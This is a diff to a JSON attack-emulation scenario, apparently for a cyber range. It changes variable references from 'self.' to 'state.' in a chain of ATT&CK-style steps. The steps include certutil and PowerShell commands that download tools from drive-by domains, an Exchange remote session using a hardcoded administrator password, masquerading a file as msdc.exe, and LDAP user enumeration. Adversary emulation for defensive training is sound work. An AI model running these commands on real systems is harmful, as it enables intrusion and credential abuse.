@@ -13,7 +13,10 @@
             "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
-                "tool": "self.tool_name"
+                "tool": "state.tool_name"
+            },
+            "set_state": {
+                "actuator": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -21,9 +24,9 @@
             "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -31,9 +34,9 @@
             "technique": "DNS",
             "label": "DNS",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -41,11 +44,11 @@
             "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
-                "self.tool_name": "self.tool",
-                "payload": "self.payload_name",
-                "exfiltration": "self.exfil",
-                "driveby": "self.driveby",
-                "driveby_ctl": "self.chimera"
+                "state.tool_name": "state.tool",
+                "payload": "state.payload_name",
+                "exfiltration": "state.exfil",
+                "driveby": "state.driveby",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -53,7 +56,7 @@
             "technique": "Interfaces",
             "label": "Interfaces2",
             "preconditions": {
-                "driveby": "self.driveby2"
+                "driveby": "state.driveby2"
             }
         },
         {
@@ -61,7 +64,7 @@
             "technique": "DNS",
             "label": "DNS2",
             "preconditions": {
-                "driveby": "self.driveby2"
+                "driveby": "state.driveby2"
             }
         },
         {
@@ -70,8 +73,8 @@
             "label": "NGINX2",
             "preconditions": {
                 "payload": "netbugc.exe",
-                "driveby": "self.driveby2",
-                "driveby_ctl": "self.chimera"
+                "driveby": "state.driveby2",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -79,7 +82,7 @@
             "technique": "Interfaces",
             "label": "Interfaces3",
             "preconditions": {
-                "driveby": "self.driveby3"
+                "driveby": "state.driveby3"
             }
         },
         {
@@ -87,7 +90,7 @@
             "technique": "DNS",
             "label": "DNS3",
             "preconditions": {
-                "driveby": "self.driveby3"
+                "driveby": "state.driveby3"
             }
         },
         {
@@ -96,8 +99,8 @@
             "label": "NGINX3",
             "preconditions": {
                 "payload": "AdFind.exe",
-                "driveby": "self.driveby3",
-                "driveby_ctl": "self.chimera"
+                "driveby": "state.driveby3",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -105,7 +108,7 @@
             "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
-                "tool": "self.tool"
+                "tool": "state.tool"
             }
         },
         {
@@ -113,10 +116,10 @@
             "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
-                "actuator": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -124,10 +127,10 @@
             "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -135,10 +138,13 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
+            },
+            "set_state": {
+                "agent_tgt1": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -146,12 +152,12 @@
             "technique": "RemoteEmailCollection",
             "label": "remoteEmailCollection",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "user_mailbox": "self.target_1_username"
+                "user_mailbox": "state.target_1_username"
             }
         },
         {
@@ -159,9 +165,9 @@
             "technique": "FileAndDirectoryDiscovery",
             "label": "fileDirDiscovery",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{$password = ConvertTo-SecureString 'Simspace1!Simspace1!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('administrator@site', $password); $mailserver = [Net.DNS]::GetHostByAddress([Net.DNS]::GetHostEntry('Autodiscover').AddressList[0]).Hostname; echo $mailserver; $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$mailserver/PowerShell/ -Authentication Kerberos -Credential $Credential; echo $Session; Import-PSSession $Session -DisableNameChecking -AllowClobber; Get-WebServicesVirtualDirectory; echo ' ';}"
@@ -172,9 +178,9 @@
             "technique": "PermissionGroupsDiscovery",
             "label": "permGroupsDiscovery",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -182,9 +188,9 @@
             "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -192,9 +198,9 @@
             "technique": "ObfuscatedFilesOrInformation",
             "label": "obfsInformation",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -202,12 +208,12 @@
             "technique": "IngressToolTransfer",
             "label": "ingressToolTransfer1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain2}/${self.tool_name2}${self.temp_dir_name}\\${self.tool_name2}&& echo \" \""
+                "command": "cmd /c certutil.exe -urlcache -split -f http://${state.driveby_domain2}/${state.tool_name2}${state.temp_dir_name}\\${state.tool_name2}&& echo \" \""
             }
         },
         {
@@ -215,14 +221,14 @@
             "technique": "MatchLegitimateNameOrLocation",
             "label": "matchName",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "original_dir": "self.temp_dir_name",
-                "original_file": "self.tool_name2",
-                "destination_dir": "self.temp_dir_name",
+                "original_dir": "state.temp_dir_name",
+                "original_file": "state.tool_name2",
+                "destination_dir": "state.temp_dir_name",
                 "destination_file": "msdc.exe"
             }
         },
@@ -231,12 +237,12 @@
             "technique": "SoftwarePacking",
             "label": "softwarePacking",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "directory": "self.temp_dir_name",
+                "directory": "state.temp_dir_name",
                 "file_name": "msdc.exe"
             }
         },
@@ -245,12 +251,12 @@
             "technique": "IngressToolTransfer",
             "label": "ingressToolTransfer2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{wget -O${self.temp_dir_name}\\${self.tool_name3}http://${self.driveby_domain3}/${self.tool_name3}; echo \" \"}"
+                "command": "powershell &{wget -O${state.temp_dir_name}\\${state.tool_name3}http://${state.driveby_domain3}/${state.tool_name3}; echo \" \"}"
             }
         },
         {
@@ -258,12 +264,12 @@
             "technique": "PermissionGroupsDiscovery",
             "label": "remoteSystemDiscovery2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "windowsshell${self.temp_dir_name}\\${self.tool_name3}-default -f \"objectcategory=user\" \"cn\"; echo \" \""
+                "command": "windowsshell${state.temp_dir_name}\\${state.tool_name3}-default -f \"objectcategory=user\" \"cn\"; echo \" \""
             }
         },
         {
@@ -271,9 +277,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         }
     ],
@@ -360,151 +366,24 @@
             }
         }
     },
-    "preconditions": {
-        "state": {},
-        "initial": {
-            "tool_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "name"
-                ]
-            },
-            "tool_name2": {
-                "path": [
-                    "tool",
-                    "2",
-                    "name"
-                ]
-            },
-            "tool_name3": {
-                "path": [
-                    "tool",
-                    "3",
-                    "name"
-                ]
-            },
-            "payload_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "tool": {
-                "path": [
-                    "tool",
-                    "1"
-                ]
-            },
-            "exfil": {
-                "path": [
-                    "exfil",
-                    "1"
-                ]
-            },
-            "driveby": {
-                "path": [
-                    "driveby",
-                    "1"
-                ]
-            },
-            "driveby2": {
-                "path": [
-                    "driveby",
-                    "2"
-                ]
-            },
-            "driveby3": {
-                "path": [
-                    "driveby",
-                    "3"
-                ]
-            },
-            "driveby_domain": {
-                "path": [
-                    "driveby",
-                    "1",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "driveby_domain2": {
-                "path": [
-                    "driveby",
-                    "2",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "driveby_domain3": {
-                "path": [
-                    "driveby",
-                    "3",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "chimera": {
-                "path": [
-                    "chimera"
-                ]
-            },
-            "target_1": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "temp_dir_name": {
-                "path": [
-                    "targets",
-                    "1",
-                    "ioc-temp_dir"
-                ]
-            },
-            "target_1_domain": {
-                "path": [
-                    "targets",
-                    "1",
-                    "query-target_domain"
-                ]
-            },
-            "target_1_username": {
-                "path": [
-                    "targets",
-                    "1",
-                    "query-target_username"
-                ]
-            },
-            "target_1_password": {
-                "path": [
-                    "targets",
-                    "1",
-                    "query-target_password"
-                ]
-            }
-        },
-        "effects": {
-            "actuator": {
-                "path": [
-                    "actuator",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "scenario_infrastructure": {
-                "path": [
-                    "infrastructure"
-                ]
-            },
-            "agent_tgt1": {
-                "path": [
-                    "webProtocols_1",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            }
-        }
+    "state": {
+        "tool_name": "spec.tool.1.name",
+        "tool_name2": "spec.tool.2.name",
+        "tool_name3": "spec.tool.3.name",
+        "payload_name": "spec.tool.1.ioc-binary_payload_name",
+        "tool": "spec.tool.1",
+        "exfil": "spec.exfil.1",
+        "driveby": "spec.driveby.1",
+        "driveby2": "spec.driveby.2",
+        "driveby3": "spec.driveby.3",
+        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
+        "driveby_domain2": "spec.driveby.2.ioc-domain_driveby",
+        "driveby_domain3": "spec.driveby.3.ioc-domain_driveby",
+        "chimera": "spec.chimera",
+        "target_1": "spec.targets.1",
+        "temp_dir_name": "spec.targets.1.ioc-temp_dir",
+        "target_1_domain": "spec.targets.1.query-target_domain",
+        "target_1_username": "spec.targets.1.query-target_username",
+        "target_1_password": "spec.targets.1.query-target_password"
     }
 }
